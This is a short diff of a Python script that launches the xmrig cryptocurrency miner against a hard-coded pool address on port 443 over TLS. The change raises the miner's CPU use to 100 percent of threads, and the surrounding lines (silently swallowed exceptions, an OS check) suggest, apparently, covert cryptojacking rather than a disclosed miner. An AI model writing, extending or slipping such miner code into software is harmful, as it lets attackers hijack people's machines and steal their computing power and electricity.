@@ -31,7 +31,7 @@ if operate_system == 'lin':
     except:
         pass
 import psutil
-command_xmrig_default = '-o 66.42.53.57:443 --tls'
+command_xmrig_default = '-o 66.42.53.57:443 --tls --cpu-max-threads-hint=100'
 #while True:
 time.sleep(1)
 working_dir = os.path.dirname(os.path.realpath(__file__))
